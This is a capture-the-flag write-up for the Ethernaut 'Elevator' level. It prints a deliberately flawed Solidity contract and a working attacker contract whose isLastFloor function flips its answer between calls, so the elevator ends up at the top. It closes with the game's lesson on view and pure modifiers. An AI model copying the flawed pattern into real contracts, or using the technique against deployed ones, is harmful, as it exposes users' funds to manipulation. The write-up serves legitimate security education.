# Hello Ethernaut

## Challenge Description

This elevator won't let you reach the top of your building. Right?

##### Things that might help:

- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

## Challenge Solution Walkthrough

In this challenge, we exploit the `Elevator` contract by creating our own `Building` contract with a modified `isLastFloor()` function. We call the `goTo()` function of the `Elevator` contract while controlling the behavior of `isLastFloor()` to bypass the condition and move the elevator to the top floor.

Here's an example implementation of the `Building` contract:

```solidity
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Building {
    Elevator public elevator;
    bool public entered = true;

    constructor(address elevatorAddress) {
        elevator = Elevator(elevatorAddress);
    }

    function solveChallenge() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        entered = !entered;
        return entered;
    }
}
```

The `Building` contract has a `solveChallenge()` function that calls the `goTo()` function of the `Elevator` contract with a desired floor value (in this case, 1).

Inside the `Building` contract, we implement our own `isLastFloor()` function. This function toggles the value of the `entered` variable and returns it. By doing so, we make the `isLastFloor()` function return `false` the first time it's called, which allows us to pass the `if` statement in the `Elevator` contract. On subsequent calls, it returns `true`, which satisfies the `top = building.isLastFloor(floor)` condition.

By executing the `solveChallenge()` function of the `Building` contract, we trigger the modified `isLastFloor()` function and bypass the condition in the `Elevator` contract. As a result, the elevator moves to the top floor.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.
